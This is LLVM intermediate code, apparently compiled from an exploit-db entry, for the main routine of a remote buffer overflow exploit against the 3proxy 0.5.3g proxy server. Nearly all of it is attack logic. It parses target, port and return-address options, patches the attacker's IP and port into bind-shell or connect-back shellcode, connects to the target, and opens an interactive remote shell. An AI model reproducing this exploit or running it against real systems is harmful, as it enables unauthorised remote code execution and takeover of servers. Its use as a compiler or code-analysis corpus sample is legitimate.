; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3821.c_main.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_3821.c_main.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32, i8*, i32 }
%struct.hostent = type { i64 }

@.str = private unnamed_addr constant [116 x i8] c"[*] 3proxy[v0.5.3g]: (linux) remote buffer overflow exploit.\0A[*] by: vade79/v9 v9@fakehalo.us (fakehalo/realhalo)\0A\0A\00", align 1
@DFL_PORT = common dso_local global i32 0, align 4
@tbl = common dso_local global %struct.TYPE_2__ zeroinitializer, align 8
@DFL_SPORT = common dso_local global i32 0, align 4
@DFL_RETADDR = common dso_local global i32 0, align 4
@.str.1 = private unnamed_addr constant [13 x i8] c"h:p:s:c:r:+:\00", align 1
@EOF = common dso_local global i32 0, align 4
@optarg = common dso_local global i32 0, align 4
@.str.2 = private unnamed_addr constant [33 x i8] c"main(): allocating memory failed\00", align 1
@.str.3 = private unnamed_addr constant [29 x i8] c"invalid host/ip. (-c option)\00", align 1
@.str.4 = private unnamed_addr constant [3 x i8] c"%x\00", align 1
@x86_bind = common dso_local global i32* null, align 8
@x86_ptr = common dso_local global i32* null, align 8
@x86_conn = common dso_local global i32* null, align 8
@.str.5 = private unnamed_addr constant [79 x i8] c"ip(-c option) and/or port(-s option) appear to contain a null-byte, try again.\00", align 1
@.str.6 = private unnamed_addr constant [22 x i8] c"[*] target\09\09\09: %s:%d\0A\00", align 1
@.str.7 = private unnamed_addr constant [35 x i8] c"[*] shellcode type\09\09: %s(port=%d)\0A\00", align 1
@.str.8 = private unnamed_addr constant [13 x i8] c"connect-back\00", align 1
@.str.9 = private unnamed_addr constant [10 x i8] c"bindshell\00", align 1
@.str.10 = private unnamed_addr constant [47 x i8] c"[*] return address($eip)\09: 0x%.8x(+%d=0x%.8x)\0A\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i32 @main(i32 %0, i8** %1) #0 {
  %3 = alloca i32, align 4
  %4 = alloca i32, align 4
  %5 = alloca i8**, align 8
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca %struct.hostent*, align 8
  %10 = alloca i32, align 4
  store i32 0, i32* %3, align 4
  store i32 %0, i32* %4, align 4
  store i8** %1, i8*** %5, align 8
  store i32 0, i32* %6, align 4
  store i32 0, i32* %7, align 4
  store i32 0, i32* %8, align 4
  store i32 0, i32* %10, align 4
  %11 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([116 x i8], [116 x i8]* @.str, i64 0, i64 0))
  %12 = load i32, i32* @DFL_PORT, align 4
  store i32 %12, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %13 = load i32, i32* @DFL_SPORT, align 4
  store i32 %13, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %14 = load i32, i32* @DFL_RETADDR, align 4
  store i32 %14, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  br label %15

15:                                               ; preds = %80, %2
  %16 = load i32, i32* %4, align 4
  %17 = load i8**, i8*** %5, align 8
  %18 = call i32 @getopt(i32 %16, i8** %17, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.1, i64 0, i64 0))
  store i32 %18, i32* %6, align 4
  %19 = load i32, i32* @EOF, align 4
  %20 = icmp ne i32 %18, %19
  br i1 %20, label %21, label %81

21:                                               ; preds = %15
  %22 = load i32, i32* %6, align 4
  switch i32 %22, label %75 [
    i32 104, label %23
    i32 112, label %34
    i32 115, label %38
    i32 99, label %42
    i32 114, label %68
    i32 43, label %71
  ]

23:                                               ; preds = %21
  %24 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %25 = icmp ne i8* %24, null
  br i1 %25, label %33, label %26

26:                                               ; preds = %23
  %27 = load i32, i32* @optarg, align 4
  %28 = call i64 @strdup(i32 %27)
  %29 = inttoptr i64 %28 to i8*
  store i8* %29, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %30 = icmp ne i8* %29, null
  br i1 %30, label %33, label %31

31:                                               ; preds = %26
  %32 = call i32 @printe(i8* getelementptr inbounds ([33 x i8], [33 x i8]* @.str.2, i64 0, i64 0), i32 1)
  br label %33

33:                                               ; preds = %31, %26, %23
  br label %80

34:                                               ; preds = %21
  %35 = load i32, i32* @optarg, align 4
  %36 = call i8* @atoi(i32 %35)
  %37 = ptrtoint i8* %36 to i32
  store i32 %37, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  br label %80

38:                                               ; preds = %21
  %39 = load i32, i32* @optarg, align 4
  %40 = call i8* @atoi(i32 %39)
  %41 = ptrtoint i8* %40 to i32
  store i32 %41, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  br label %80

42:                                               ; preds = %21
  %43 = load i32, i32* @optarg, align 4
  %44 = call i32 @inet_addr(i32 %43)
  store i32 %44, i32* %10, align 4
  %45 = icmp ne i32 %44, 0
  br i1 %45, label %46, label %67

46:                                               ; preds = %42
  %47 = load i32, i32* @optarg, align 4
  %48 = call %struct.hostent* @gethostbyname(i32 %47)
  store %struct.hostent* %48, %struct.hostent** %9, align 8
  %49 = icmp ne %struct.hostent* %48, null
  br i1 %49, label %50, label %57

50:                                               ; preds = %46
  %51 = bitcast i32* %10 to i8*
  %52 = load %struct.hostent*, %struct.hostent** %9, align 8
  %53 = getelementptr inbounds %struct.hostent, %struct.hostent* %52, i32 0, i32 0
  %54 = load i64, i64* %53, align 8
  %55 = inttoptr i64 %54 to i8*
  %56 = call i32 @memcpy(i8* %51, i8* %55, i32 4)
  br label %57

57:                                               ; preds = %50, %46
  %58 = load i32, i32* %10, align 4
  %59 = icmp eq i32 %58, -1
  br i1 %59, label %60, label %61

60:                                               ; preds = %57
  store i32 0, i32* %10, align 4
  br label %61

61:                                               ; preds = %60, %57
  %62 = load i32, i32* %10, align 4
  %63 = icmp ne i32 %62, 0
  br i1 %63, label %66, label %64

64:                                               ; preds = %61
  %65 = call i32 @printe(i8* getelementptr inbounds ([29 x i8], [29 x i8]* @.str.3, i64 0, i64 0), i32 0)
  br label %66

66:                                               ; preds = %64, %61
  br label %67

67:                                               ; preds = %66, %42
  br label %80

68:                                               ; preds = %21
  %69 = load i32, i32* @optarg, align 4
  %70 = call i32 @sscanf(i32 %69, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.4, i64 0, i64 0), i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2))
  br label %80

71:                                               ; preds = %21
  %72 = load i32, i32* @optarg, align 4
  %73 = call i8* @atoi(i32 %72)
  %74 = ptrtoint i8* %73 to i32
  store i32 %74, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  br label %80

75:                                               ; preds = %21
  %76 = load i8**, i8*** %5, align 8
  %77 = getelementptr inbounds i8*, i8** %76, i64 0
  %78 = load i8*, i8** %77, align 8
  %79 = call i32 @usage(i8* %78)
  br label %80

80:                                               ; preds = %75, %71, %68, %67, %38, %34, %33
  br label %15

81:                                               ; preds = %15
  %82 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %83 = icmp ne i8* %82, null
  br i1 %83, label %89, label %84

84:                                               ; preds = %81
  %85 = load i8**, i8*** %5, align 8
  %86 = getelementptr inbounds i8*, i8** %85, i64 0
  %87 = load i8*, i8** %86, align 8
  %88 = call i32 @usage(i8* %87)
  br label %89

89:                                               ; preds = %84, %81
  %90 = load i32, i32* %10, align 4
  %91 = icmp ne i32 %90, 0
  br i1 %91, label %105, label %92

92:                                               ; preds = %89
  %93 = load i32*, i32** @x86_bind, align 8
  %94 = call i32 @strlen(i32* %93)
  store i32 %94, i32* %8, align 4
  %95 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %96 = and i32 %95, 65280
  %97 = ashr i32 %96, 8
  %98 = load i32*, i32** @x86_bind, align 8
  %99 = getelementptr inbounds i32, i32* %98, i64 20
  store i32 %97, i32* %99, align 4
  %100 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %101 = and i32 %100, 255
  %102 = load i32*, i32** @x86_bind, align 8
  %103 = getelementptr inbounds i32, i32* %102, i64 21
  store i32 %101, i32* %103, align 4
  %104 = load i32*, i32** @x86_bind, align 8
  store i32* %104, i32** @x86_ptr, align 8
  br label %137

105:                                              ; preds = %89
  %106 = load i32*, i32** @x86_conn, align 8
  %107 = call i32 @strlen(i32* %106)
  store i32 %107, i32* %8, align 4
  %108 = load i32, i32* %10, align 4
  %109 = and i32 %108, 255
  %110 = load i32*, i32** @x86_conn, align 8
  %111 = getelementptr inbounds i32, i32* %110, i64 33
  store i32 %109, i32* %111, align 4
  %112 = load i32, i32* %10, align 4
  %113 = and i32 %112, 65280
  %114 = ashr i32 %113, 8
  %115 = load i32*, i32** @x86_conn, align 8
  %116 = getelementptr inbounds i32, i32* %115, i64 34
  store i32 %114, i32* %116, align 4
  %117 = load i32, i32* %10, align 4
  %118 = and i32 %117, 16711680
  %119 = ashr i32 %118, 16
  %120 = load i32*, i32** @x86_conn, align 8
  %121 = getelementptr inbounds i32, i32* %120, i64 35
  store i32 %119, i32* %121, align 4
  %122 = load i32, i32* %10, align 4
  %123 = and i32 %122, -16777216
  %124 = lshr i32 %123, 24
  %125 = load i32*, i32** @x86_conn, align 8
  %126 = getelementptr inbounds i32, i32* %125, i64 36
  store i32 %124, i32* %126, align 4
  %127 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %128 = and i32 %127, 65280
  %129 = ashr i32 %128, 8
  %130 = load i32*, i32** @x86_conn, align 8
  %131 = getelementptr inbounds i32, i32* %130, i64 39
  store i32 %129, i32* %131, align 4
  %132 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %133 = and i32 %132, 255
  %134 = load i32*, i32** @x86_conn, align 8
  %135 = getelementptr inbounds i32, i32* %134, i64 40
  store i32 %133, i32* %135, align 4
  %136 = load i32*, i32** @x86_conn, align 8
  store i32* %136, i32** @x86_ptr, align 8
  br label %137

137:                                              ; preds = %105, %92
  %138 = load i32, i32* %8, align 4
  %139 = load i32*, i32** @x86_ptr, align 8
  %140 = call i32 @strlen(i32* %139)
  %141 = icmp ne i32 %138, %140
  br i1 %141, label %142, label %144

142:                                              ; preds = %137
  %143 = call i32 @printe(i8* getelementptr inbounds ([79 x i8], [79 x i8]* @.str.5, i64 0, i64 0), i32 1)
  br label %144

144:                                              ; preds = %142, %137
  %145 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %146 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %147 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.6, i64 0, i64 0), i8* %145, i32 %146)
  %148 = load i32, i32* %10, align 4
  %149 = icmp ne i32 %148, 0
  %150 = zext i1 %149 to i64
  %151 = select i1 %149, i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.8, i64 0, i64 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.9, i64 0, i64 0)
  %152 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %153 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str.7, i64 0, i64 0), i8* %151, i32 %152)
  %154 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %155 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %156 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 2), align 8
  %157 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 4), align 8
  %158 = add nsw i32 %156, %157
  %159 = call i32 (i8*, ...) @printf(i8* getelementptr inbounds ([47 x i8], [47 x i8]* @.str.10, i64 0, i64 0), i32 %154, i32 %155, i32 %158)
  %160 = load i32, i32* %10, align 4
  %161 = icmp ne i32 %160, 0
  br i1 %161, label %162, label %170

162:                                              ; preds = %144
  %163 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %164 = call i32 @getshell_bind_init(i32 %163)
  store i32 %164, i32* %7, align 4
  %165 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %166 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %167 = call i32 @proxy_connect(i8* %165, i32 %166)
  %168 = load i32, i32* %7, align 4
  %169 = call i32 @getshell_bind_accept(i32 %168)
  store i32 %169, i32* %7, align 4
  br label %177

170:                                              ; preds = %144
  %171 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %172 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 0), align 8
  %173 = call i32 @proxy_connect(i8* %171, i32 %172)
  %174 = load i8*, i8** getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 3), align 8
  %175 = load i32, i32* getelementptr inbounds (%struct.TYPE_2__, %struct.TYPE_2__* @tbl, i32 0, i32 1), align 4
  %176 = call i32 @getshell_conn(i8* %174, i32 %175)
  store i32 %176, i32* %7, align 4
  br label %177

177:                                              ; preds = %170, %162
  %178 = load i32, i32* %7, align 4
  %179 = icmp sgt i32 %178, 0
  br i1 %179, label %180, label %183

180:                                              ; preds = %177
  %181 = load i32, i32* %7, align 4
  %182 = call i32 @proc_shell(i32 %181)
  br label %183

183:                                              ; preds = %180, %177
  %184 = call i32 @exit(i32 0) #3
  unreachable
}

declare dso_local i32 @printf(i8*, ...) #1

declare dso_local i32 @getopt(i32, i8**, i8*) #1

declare dso_local i64 @strdup(i32) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i8* @atoi(i32) #1

declare dso_local i32 @inet_addr(i32) #1

declare dso_local %struct.hostent* @gethostbyname(i32) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sscanf(i32, i8*, i32*) #1

declare dso_local i32 @usage(i8*) #1

declare dso_local i32 @strlen(i32*) #1

declare dso_local i32 @getshell_bind_init(i32) #1

declare dso_local i32 @proxy_connect(i8*, i32) #1

declare dso_local i32 @getshell_bind_accept(i32) #1

declare dso_local i32 @getshell_conn(i8*, i32) #1

declare dso_local i32 @proc_shell(i32) #1

; Function Attrs: noreturn
declare dso_local i32 @exit(i32) #2

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #2 = { noreturn "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #3 = { noreturn }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
